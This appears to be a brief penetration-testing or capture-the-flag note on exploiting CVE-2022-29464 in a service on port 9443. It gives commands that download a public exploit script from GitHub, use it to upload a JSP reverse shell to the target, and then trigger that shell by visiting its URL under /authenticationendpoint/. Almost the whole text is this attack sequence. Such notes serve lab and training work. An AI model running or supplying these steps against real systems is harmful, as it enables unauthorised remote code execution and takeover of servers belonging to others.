```bash - kali
wget https://raw.githubusercontent.com/hakivvi/CVE-2022-29464/main/exploit.py
```

![[0._Reverse shells (WEB)#jsp]]

```bash - kali
python3 exploit.py https://$TARGET:9443 reverse.jsp
```

Next, we just visit:

`https://$TARGET:9443/authenticationendpoint/reverse.jsp`














